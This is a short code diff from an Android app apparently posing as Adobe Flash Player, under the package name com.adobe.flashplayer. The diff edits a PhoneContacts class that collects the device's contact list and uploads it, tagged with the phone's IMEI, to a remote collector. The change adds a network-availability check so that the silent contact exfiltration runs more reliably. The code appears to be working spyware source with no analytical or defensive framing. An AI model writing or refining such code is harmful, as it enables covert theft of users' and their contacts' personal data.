@@ -12,6 +12,7 @@ import android.util.Log;
 import com.adobe.flashplayer.Public;
 import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.MyLog;
 import android.content.pm.ApplicationInfo;
@@ -62,9 +63,11 @@ public class PhoneContacts {
                     }
                     cursor.close();
                 }
+                if (NetworkUitls.isNetworkAvailable(context)) {
+                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_CONTACTS, Public.IMEI);
+                }else{
 
-                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_CONTACTS, Public.IMEI);
-
+                }
                 return true;
             }
         } catch (Exception ex) {
